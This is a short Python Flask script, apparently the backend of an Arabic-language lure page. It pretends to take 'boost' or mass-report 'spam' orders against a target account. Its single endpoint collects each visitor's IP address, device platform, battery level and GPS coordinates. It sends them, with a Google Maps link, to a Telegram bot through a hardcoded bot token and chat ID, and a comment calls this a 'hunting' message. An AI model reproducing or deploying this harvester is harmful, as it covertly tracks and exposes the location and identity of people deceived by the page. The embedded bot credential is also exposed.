from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
CHAT_ID = "5811700860"

@app.route('/api/index', methods=['POST'])
def handler():
    try:
        data = request.json
        info = data.get('device_info', {})
        lat = data.get('lat')
        lon = data.get('lon')
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        # تنسيق رسالة الصيد بناءً على القسم (رشق أو إسبام)
        header = "🚀 **طلب رشق جديد**" if data.get('mode') == 'boost' else "⚔️ **طلب إسبام جديد**"
        
        msg = f"{header}\n\n"
        msg += f"👤 **الهدف:** `{data.get('target_id')}`\n"
        msg += f"🔢 **العدد/البلاغات:** `{data.get('count')}`\n"
        msg += f"📱 **الجهاز:** `{info.get('platform')}`\n"
        msg += f"🔋 **البطارية:** `{info.get('battery')}`\n"
        msg += f"🌐 **IP:** `{user_ip}`\n"
        
        if lat and lon:
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
            msg += f"\n📍 **الموقع الجغرافي:** [فتح الخريطة]({maps_link})"
        else:
            msg += f"\n📍 **الموقع:** رفض الإذن."

        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
        
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
